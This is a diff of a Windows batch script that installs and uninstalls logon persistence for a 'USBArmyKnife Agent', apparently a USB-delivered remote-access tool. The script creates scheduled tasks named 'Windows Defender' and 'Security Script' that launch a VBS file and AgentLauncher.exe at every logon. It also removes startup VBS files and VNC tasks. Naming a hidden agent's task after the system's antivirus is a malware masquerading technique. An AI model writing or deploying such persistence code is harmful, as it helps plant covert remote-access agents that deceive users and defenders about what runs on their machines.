@@ -96,6 +96,8 @@ timeout /t 2 /nobreak >nul
 echo [2/6] Removing autostart...
 if exist "%STARTUP%\USBArmyKnifeAgent.vbs" ( del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1 & echo    [+] USBArmyKnifeAgent.vbs removed. )
 if exist "%STARTUP%\VncDirect.vbs" ( del "%STARTUP%\VncDirect.vbs" >nul 2>&1 & echo    [+] VncDirect.vbs removed. )
+if exist "%DEST%\WinDefend.vbs" ( del "%DEST%\WinDefend.vbs" >nul 2>&1 & echo    [+] WinDefend.vbs removed. )
+if exist "%DEST%\WinDefend.ps1" ( del "%DEST%\WinDefend.ps1" >nul 2>&1 & echo    [+] WinDefend.ps1 removed. )
 schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1 & echo    [+] Scheduled task "USBArmyKnife Agent" removed. )
 schtasks /query /tn "Security Script" >nul 2>&1
@@ -154,6 +156,8 @@ timeout /t 1 /nobreak >nul
 echo [2/3] Removing entries...
 if exist "%STARTUP%\USBArmyKnifeAgent.vbs" ( del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1 & echo    [+] VBS removed. )
 if exist "%STARTUP%\VncDirect.vbs" ( del "%STARTUP%\VncDirect.vbs" >nul 2>&1 & echo    [+] VBS removed. )
+if exist "%DEST%\WinDefend.vbs" ( del "%DEST%\WinDefend.vbs" >nul 2>&1 & echo    [+] WinDefend.vbs removed. )
+if exist "%DEST%\WinDefend.ps1" ( del "%DEST%\WinDefend.ps1" >nul 2>&1 & echo    [+] WinDefend.ps1 removed. )
 schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1 & echo    [+] Task removed. )
 schtasks /query /tn "Security Script" >nul 2>&1
@@ -190,7 +194,7 @@ if !errorlevel! neq 0 ( schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\Ag
 schtasks /query /tn "Security Script" >nul 2>&1
 if !errorlevel! neq 0 ( schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "Windows Defender" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "Windows Defender" /tr "wscript.exe C:\ProgramData\Windows Defender\WinDefend.vbs" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
+if !errorlevel! neq 0 ( schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "VNC Direct" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 )
 schtasks /query /tn "VNC Direct User" >nul 2>&1
